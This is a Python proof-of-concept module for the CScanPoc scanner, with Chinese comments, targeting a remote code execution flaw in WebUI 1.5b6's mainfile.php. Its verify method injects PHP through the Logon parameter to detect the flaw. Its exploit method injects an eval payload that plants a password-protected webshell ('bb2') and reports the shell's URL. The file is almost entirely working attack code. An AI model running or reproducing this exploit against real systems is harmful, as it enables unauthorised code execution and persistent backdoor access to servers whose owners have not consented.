# coding: utf-8
from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WebUI_0101'  # 平台漏洞编号，留空
    name = 'WebUI 1.5b6 /mainfile.php 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-04-28'  # 漏洞公布时间
    desc = '''
    WebUI 1.5b6 has code execution in mainfile.php
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36821/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WebUI'  # 漏洞应用名称
    product_version = '1.5b6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e914c8aa-e386-4c02-a0c5-6f9e85f892a1'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target = self.target
            payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);%27'
            vul_url = target + payload
            response = requests.get(vul_url)
            text = response.text
            if '698d51a19d8a121ce581499d7b701668' in text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target = self.target
            payload = '/mainfile.php?username=RCE&password=BB2&_login=1&Logon=%27;echo%20md5(111);@eval($_POST[bb2]);%27'
            vul_url = target + payload
            response = requests.get(vul_url)
            text = response.text
            if '698d51a19d8a121ce581499d7b701668' in text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;webshell={webshell},passwd=bb2'.format(
                    target=self.target, name=self.vuln.name, webshell=vul_url))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
